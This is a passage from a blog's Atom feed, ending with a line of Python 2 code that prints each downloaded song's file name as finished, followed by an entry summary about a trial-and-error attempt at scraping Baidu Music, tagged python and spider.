               sys.stdout.flush()</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'\n'</span> + it[<span class="string">'songName'</span>] + <span class="string">'.'</span> + it[<span class="string">'format'</span>], <span class="string">" finished"</span></span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="Take_a_sad_song,_and_make_it_better：爬取百度音乐">Take a sad song, and make it better：爬取百度音乐</h2><p>以下，个人的一个trial and error的过程，仅供参考。</p>
<]]>
    </summary>
    
      <category term="python" scheme="http://reverland.org/tags/python/"/>
    
      <category term="spider" scheme="http://reverland.org/tags/spider/"/>
    
      <category term="python" scheme="http://reverland.org/categories/python/"/>
    
  </entry>
  
</feed>
